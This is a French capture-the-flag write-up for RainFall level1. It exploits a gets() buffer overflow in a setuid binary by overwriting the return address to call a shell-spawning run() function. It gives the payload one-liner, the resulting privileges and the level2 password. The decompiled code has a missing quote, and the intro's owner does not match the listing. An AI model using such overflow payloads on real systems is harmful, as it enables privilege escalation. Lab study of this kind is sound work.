# `Level1`

## Introduction

Nous avons un exécutable `level1` avec les droits de l'utilisateur `flag1` et du groupe `level1`.

```bash
level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
level1@RainFall:~$
```

Ce programme nous aidera à obtenir le flag.

## Étapes d'exploitation

### 1. Analyse du programme

Lorsque l'on exécute le programme, il demande une entrée stdin. Peu importe ce que nous entrons, rien ne se passe. En décompilant le programme, voici ce que fait la fonction `main` :

```c
void main(void)
{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```

La fonction `main` utilise `gets` pour lire l'entrée utilisateur dans un buffer de 76 octets, permettant ainsi un débordement de tampon.

### 2. Fonction `run`

Nous observons également une fonction `run` qui est appelée pour ouvrir un shell. Nous allons exploiter cette fonction.

```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh);
  return;
}
```

### 3. Exploitation du débordement de tampon

Nous allons provoquer un débordement pour écraser l'adresse de retour de la fonction `main` avec l'adresse de la fonction `run`.

### 4. Vérification de l'architecture CPU

Nous vérifions l'architecture du CPU pour déterminer comment les adresses sont stockées.

```bash
level1@RainFall:~$ lscpu
Architecture:          i686
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 186
Stepping:              2
CPU MHz:               2611.200
BogoMIPS:              5222.40
Hypervisor vendor:     KVM
Virtualization type:   full
L1d cache:             48K
L1i cache:             32K
L2 cache:              1280K
L3 cache:              18432K
```

Le byte order est en little endian, donc nous devons inverser l'adresse que nous allons envoyer en Python pour la fonction `run`.

### 5. Génération et envoi du payload

Nous utilisons Python pour générer le payload et l'envoyer au programme `level1` :

```bash
(python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat -) | ./level1
```

Cela lancera la fonction `run` et ouvrira un shell car :

```c
void run(void)
{
  fwrite("Good... Wait what?\n", 1, 0x13, stdout);
  system("/bin/sh);
  return;
}
```

### 6. Vérification et extraction du flag

Une fois dans le shell, nous vérifions les droits de l'utilisateur :

```bash
-- id --
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)

-- whoami --
level2
```

Nous avons donc les droits de `level2` et nous pouvons lire le flag :

```bash
-- cat /home/user/level2/.pass --
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

### Conclusion

Nous avons exploité le débordement de tampon dans le programme `level1` pour obtenir un shell avec les droits de `level2`, ce qui nous permet de lire le flag.

---

Bravo ! Vous avez réussi à exploiter la vulnérabilité et à obtenir le flag !